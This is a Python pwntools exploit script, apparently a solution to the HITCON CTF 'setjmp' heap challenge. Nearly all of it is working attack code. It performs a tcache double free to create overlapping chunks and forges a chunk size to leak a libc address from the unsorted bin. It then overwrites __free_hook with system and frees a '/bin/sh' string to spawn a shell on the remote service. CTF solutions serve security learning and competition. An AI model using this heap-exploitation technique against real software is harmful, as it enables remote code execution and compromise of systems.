from pwn import *
import sys

#Cre: vilex1337

_path = "./run_patched"
exe = ELF(_path)
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
add = 'setjmp.chal.hitconctf.com'
port = 1337
cmd = '''
    continue
'''

_option = { 'run' : process(_path), 
            'exp' : remote(add, port)}
def conn():
    if(len(sys.argv) == 1):
        return gdb.debug(_path, cmd)
    return _option[sys.argv[1]]

def p(_data):
    return p64(_data, endian = 'little')

chall = conn()

def check():
    chall.interactive()
    exit()

RESTART = 1
NEW = 2
DEL = 3
CHANGE = 4
VIEW = 5
EXIT = 6

def _op(_option):
    chall.sendafter(b'> ', _option)

def _short(_option):    #restart/ view
    _op(str(_option).encode() + b'\n')

def _long(_option, _usr, _pass):    #new/ change
    _op(str(_option).encode() + b'\n')
    _op(_usr)
    _op(_pass)

def _del(_usr):     #Delete _usr
    _op(str(DEL).encode() + b'\n')
    _op(_usr)

def _create(_RET): #Create overlapped chunk by double free in tcache so _write can write to _addr
    _del(b'root\n')
    _name = _leak()
    _long(CHANGE, p(_name), b'xxx\n')
    _del(p(_name))
    _name = _leak()
    _long(CHANGE, p(_name), b'xxx\n')
    _del(p(_name))
    if(_RET):
        return _name

def _write(_addr, _usr, _pass):     #Write to _addr with _usr and _pass
    _long(NEW, p(_addr), p(_addr))
    _long(NEW, p(_addr), p(_addr))
    _long(NEW, _usr, _pass)
    return 0

def _leak():    #Leak username
    _short(VIEW)
    return int.from_bytes(chall.recvuntil(b':')[:-1], 'little')

def _reset():   #This will allocate all current freed chunk, make process new again
    for i in range(4):
        _short(RESTART)

def main():

    #Modify current chunk's size to 0x441
    _name = _create(1)
    _write(_name - 0x10, p(_name - 0x10), p(0x441))

    #Spray chunk to make current chunk size legit
    for i in range(15):
        _long(NEW, str(i).encode() + b'\n', p(0x31))
    for i in range(10, 15):
        _del(str(i).encode() + b'\n')

    #Free current chunk with size 0x441 so it will contant libc_address from unsorted bin
    _del(p(_name))
    _reset()

    #Leak libc
    _libc_leak = _name - 0x370 + 0x780
    _create(0)
    _write(_libc_leak, b'\n', b'|\n')
    libc.address = _leak() - 0x1ecc0a
    _reset()
    
    #Overwrite __free_hook with system
    _create(0)
    _write(libc.sym['__free_hook'] - 0x8, p(0), p(libc.sym['system']))
    
    #Now free is system, so free a chunk have string /bin/sh will call system('/bin/sh')
    _long(NEW, b'/bin/sh\n', b'hehe\n')
    _del(b'/bin/sh\n')
    chall.interactive()


if __name__ == "__main__":
    main()
